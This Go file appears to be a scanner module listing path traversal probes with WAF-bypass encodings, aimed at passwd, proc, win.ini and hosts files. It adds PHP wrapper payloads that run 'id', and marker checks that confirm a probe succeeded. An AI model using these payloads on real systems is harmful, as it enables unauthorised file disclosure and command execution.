package deeptraversal

import "strings"

// Payload is a path traversal probe with WAF-bypass encoding variant.
type Payload struct {
	Value   string
	Variant string
	Signal  string
	OS      string // "linux" or "windows"
}

// PayloadsLinux returns Linux path traversal probes.
func PayloadsLinux() []Payload {
	return []Payload{
		{Value: `../../../../etc/passwd`, Variant: "traversal", Signal: "linux_passwd", OS: "linux"},
		{Value: `../../../../../../../../etc/passwd`, Variant: "traversal_deep", Signal: "linux_passwd", OS: "linux"},
		{Value: `..%2f..%2f..%2f..%2fetc%2fpasswd`, Variant: "url_encoded", Signal: "linux_passwd", OS: "linux"},
		{Value: `..%252f..%252f..%252f..%252fetc%252fpasswd`, Variant: "double_url_encoded", Signal: "linux_passwd", OS: "linux"},
		{Value: `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`, Variant: "encoded_dots", Signal: "linux_passwd", OS: "linux"},
		{Value: `..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd`, Variant: "utf8_overlong", Signal: "linux_passwd", OS: "linux"},
		{Value: `....//....//....//etc/passwd`, Variant: "nested_filter", Signal: "linux_passwd", OS: "linux"},
		{Value: `../../../../etc/passwd%00.jpg`, Variant: "null_byte_extension", Signal: "linux_passwd", OS: "linux"},
		{Value: `/etc/passwd/./`, Variant: "dot_slash", Signal: "linux_passwd", OS: "linux"},
		{Value: `/etc/./passwd`, Variant: "dot_in_path", Signal: "linux_passwd", OS: "linux"},
		{Value: `....\/....\/....\/etc/passwd`, Variant: "mixed_slash", Signal: "linux_passwd", OS: "linux"},
		{Value: `../../../../../../../../etc/issue`, Variant: "traversal_issue", Signal: "linux_issue", OS: "linux"},
		{Value: `../../../../../../../../etc/os-release`, Variant: "traversal_os_release", Signal: "linux_os_release", OS: "linux"},
		{Value: `../../../../../../../../proc/self/environ`, Variant: "traversal_proc_environ", Signal: "linux_proc_environ", OS: "linux"},
		{Value: `../../../../../../../../proc/self/cmdline`, Variant: "traversal_proc_cmdline", Signal: "linux_proc_cmdline", OS: "linux"},
		{Value: `../../../../../../../../proc/version`, Variant: "traversal_proc_version", Signal: "linux_proc_version", OS: "linux"},
		{Value: `../../../../../../../../proc/self/maps`, Variant: "traversal_proc_maps", Signal: "linux_proc_maps", OS: "linux"},
		{Value: `php://filter/convert.base64-encode/resource=../../../../etc/passwd`, Variant: "php_filter_base64", Signal: "linux_passwd_base64", OS: "linux"},
		{Value: `php://filter/read=string.rot13/resource=../../../../etc/passwd`, Variant: "php_filter_rot13", Signal: "linux_passwd", OS: "linux"},
		{Value: `data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==`, Variant: "php_data_wrapper", Signal: "command_output", OS: "linux"},
		{Value: `expect://id`, Variant: "php_expect_wrapper", Signal: "command_output", OS: "linux"},
		{Value: `php://input`, Variant: "php_input_wrapper", Signal: "command_output", OS: "linux"},
		{Value: `file:///etc/passwd`, Variant: "file_url_scheme", Signal: "linux_passwd", OS: "linux"},
		{Value: `..%252e%252e%252fetc%252fpasswd`, Variant: "double_url_dots_slash", Signal: "linux_passwd", OS: "linux"},
		{Value: `..%c1%9c..%c1%9cetc/passwd`, Variant: "unicode_utf8_c1_9c", Signal: "linux_passwd", OS: "linux"},
		{Value: `/var/www/html/../../../../etc/passwd`, Variant: "webroot_relative", Signal: "linux_passwd", OS: "linux"},
		// Java/Tomcat-specific normalization bypass
		{Value: `..;/..;/..;/..;/etc/passwd`, Variant: "tomcat_semicolon", Signal: "linux_passwd", OS: "linux"},
		{Value: `..;/..;/..;/..;/..;/..;/etc/passwd`, Variant: "tomcat_semicolon_deep", Signal: "linux_passwd", OS: "linux"},
	}
}

// PayloadsWindows returns Windows path traversal probes.
func PayloadsWindows() []Payload {
	return []Payload{
		{Value: `..\..\..\..\windows\win.ini`, Variant: "win_backslash", Signal: "windows_ini", OS: "windows"},
		{Value: `..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts`, Variant: "win_hosts_deep", Signal: "windows_hosts", OS: "windows"},
		{Value: `..\..\..\..\..\..\..\..\windows\win.ini`, Variant: "win_ini_deep", Signal: "windows_ini", OS: "windows"},
		{Value: `../../../../../../../../windows/win.ini`, Variant: "win_deep_forward_slash", Signal: "windows_ini", OS: "windows"},
		{Value: `..\\..\\..\\..\\windows\\win.ini`, Variant: "win_escaped", Signal: "windows_ini", OS: "windows"},
		{Value: `..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`, Variant: "win_hosts_escaped_deep", Signal: "windows_hosts", OS: "windows"},
		{Value: `....\\....\\windows\\win.ini`, Variant: "win_nested", Signal: "windows_ini", OS: "windows"},
		{Value: `C:\windows\win.ini`, Variant: "win_absolute", Signal: "windows_ini", OS: "windows"},
		{Value: `c:/windows/win.ini`, Variant: "win_forward_slash", Signal: "windows_ini", OS: "windows"},
		{Value: `file:///c:/windows/win.ini`, Variant: "win_file_scheme", Signal: "windows_ini", OS: "windows"},
		{Value: `..%5c..%5c..%5c..%5cwindows%5cwin.ini`, Variant: "win_url_encoded", Signal: "windows_ini", OS: "windows"},
		{Value: `..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts`, Variant: "win_hosts_url_encoded", Signal: "windows_hosts", OS: "windows"},
		{Value: `..%255c..%255c..%255cwindows%255cwin.ini`, Variant: "win_double_url_encoded", Signal: "windows_ini", OS: "windows"},
		{Value: `..%255c..%255c..%255c..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts`, Variant: "win_hosts_double_url_encoded", Signal: "windows_hosts", OS: "windows"},
		{Value: `%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini`, Variant: "win_encoded_dots", Signal: "windows_ini", OS: "windows"},
		{Value: `..\..\..\..\windows\system32\drivers\etc\hosts`, Variant: "win_hosts", Signal: "windows_hosts", OS: "windows"},
		{Value: `C:\Windows\System32\drivers\etc\hosts`, Variant: "win_hosts_absolute", Signal: "windows_hosts", OS: "windows"},
		{Value: `c:\windows\system32\drivers\etc\hosts`, Variant: "win_hosts_lower_drive", Signal: "windows_hosts", OS: "windows"},
		{Value: `..\..\..\..\boot.ini`, Variant: "win_boot_ini", Signal: "windows_boot", OS: "windows"},
		{Value: `..\..\..\..\..\..\..\..\boot.ini`, Variant: "win_boot_ini_deep", Signal: "windows_boot", OS: "windows"},
		{Value: `..\\..\\..\\..\\windows\\win.ini%00.jpg`, Variant: "win_null_byte", Signal: "windows_ini", OS: "windows"},
		{Value: `....//....//windows/win.ini`, Variant: "win_mixed_slash", Signal: "windows_ini", OS: "windows"},
		{Value: `/windows/win.ini`, Variant: "win_leading_slash", Signal: "windows_ini", OS: "windows"},
		{Value: `\\127.0.0.1\c$\windows\win.ini`, Variant: "win_unc_path", Signal: "windows_ini", OS: "windows"},
	}
}

// Payloads returns Linux and Windows probes interleaved so both OS families are exercised.
func Payloads() []Payload {
	return MergeBalanced(PayloadsLinux(), PayloadsWindows())
}

// MergeBalanced interleaves two probe lists so neither OS is starved during scanning.
func MergeBalanced(linux, windows []Payload) []Payload {
	maxLen := len(linux)
	if len(windows) > maxLen {
		maxLen = len(windows)
	}
	out := make([]Payload, 0, len(linux)+len(windows))
	for i := 0; i < maxLen; i++ {
		if i < len(windows) {
			out = append(out, windows[i])
		}
		if i < len(linux) {
			out = append(out, linux[i])
		}
	}
	return out
}

var (
	linuxMarkers       = []string{"root:", "daemon:", "/bin/bash", "/sbin/nologin", "/bin/sh", "version=", "id=debian", "id=ubuntu", "id=alpine", "http_user_agent", "path="}
	linuxBase64Markers = []string{"cm9vdDo", "cm9vdDox", "cm9vdDp4"}
	linuxProcMarkers   = []string{"linux version", "gcc", "swapfile", "heap", "stack", "/lib/", "/usr/"}
	winMarkers         = []string{"[fonts]", "[extensions]", "for 16-bit app support", "[boot loader]", "[operating systems]"}
	winHosts           = []string{"127.0.0.1", "localhost", "# copyright"}
)

// DetectSignal reports whether a traversal probe succeeded against baseline.
func DetectSignal(body, baseline, signal string) bool {
	lower := strings.ToLower(body)
	base := strings.ToLower(baseline)
	switch {
	case strings.HasPrefix(signal, "linux_passwd_base64"):
		for _, m := range linuxBase64Markers {
			if strings.Contains(body, m) && !strings.Contains(baseline, m) {
				return true
			}
		}
	case strings.HasPrefix(signal, "linux_proc"):
		for _, m := range linuxProcMarkers {
			if strings.Contains(lower, m) && !strings.Contains(base, m) {
				return true
			}
		}
		// proc files also contain standard linux markers
		for _, m := range linuxMarkers {
			if strings.Contains(lower, m) && !strings.Contains(base, m) {
				return true
			}
		}
	case signal == "command_output":
		for _, m := range []string{"uid=", "gid=", "root:", "/bin/", "www-data", "nt authority"} {
			if strings.Contains(lower, m) && !strings.Contains(base, m) {
				return true
			}
		}
	case strings.HasPrefix(signal, "linux"):
		for _, m := range linuxMarkers {
			if strings.Contains(lower, m) && !strings.Contains(base, m) {
				return true
			}
		}
	case strings.HasPrefix(signal, "windows_hosts"):
		for _, m := range winHosts {
			if strings.Contains(lower, m) && !strings.Contains(base, m) {
				return true
			}
		}
	case strings.HasPrefix(signal, "windows"):
		for _, m := range winMarkers {
			if strings.Contains(lower, m) && !strings.Contains(base, m) {
				return true
			}
		}
	default:
		// Legacy signals (traversal, encoded_traversal, …) and unknown variants.
		for _, m := range append(append([]string{}, linuxMarkers...), winMarkers...) {
			if strings.Contains(lower, m) && !strings.Contains(base, m) {
				return true
			}
		}
		for _, m := range winHosts {
			if strings.Contains(lower, m) && !strings.Contains(base, m) {
				return true
			}
		}
	}
	return false
}
